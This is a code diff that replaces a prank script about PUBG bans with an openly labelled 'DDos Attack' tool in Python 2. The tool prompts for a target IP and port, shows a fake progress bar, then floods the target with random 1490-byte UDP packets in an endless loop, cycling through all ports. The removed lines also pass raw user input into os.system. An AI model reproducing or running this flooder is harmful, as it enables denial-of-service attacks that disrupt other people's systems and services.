@@ -1,18 +1,44 @@
-import os
 import sys
+import os
 import time
-import requests
-ID = raw_input('ID PUBG : ')
-os.system('clear')
-print 'YOUR ID ' + ID
-logo = 'Cod By Palabunii'
-print logo
-print '\x1b[33;1mi had played with hacker'
-print 'I used hacks'
-print ' I used fake uc'
-print ' i have banded because of virtual'
-print ' labar hokareki tr xot ba englizi binusa !'
-print ' \x1b[5;37;40m-------------------------------'
-print 'abe nusinaka hamuy bnusyawa ba juani !!'
-CLAY = raw_input('bo band buit ? :')
-os.system('spam dasy pe krd bo am id ya' + ID + CLAY)
+import socket
+import random
+#Dark
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet DDos Attack")
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
+
+os.system("clear")
+os.system("figlet Attack Starting")
+print "[                    ] 0% "
+time.sleep(4)
+print "[=====               ] 25%"
+time.sleep(3)
+print "[==========          ] 50%"
+time.sleep(2)
+print "[===============     ] 75%"
+time.sleep(1)
+print "[====================] 100%"
+time.sleep(2)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s port:%s by palabun"%(sent,ip,port)
+     if port == 65534:
+       port = 1
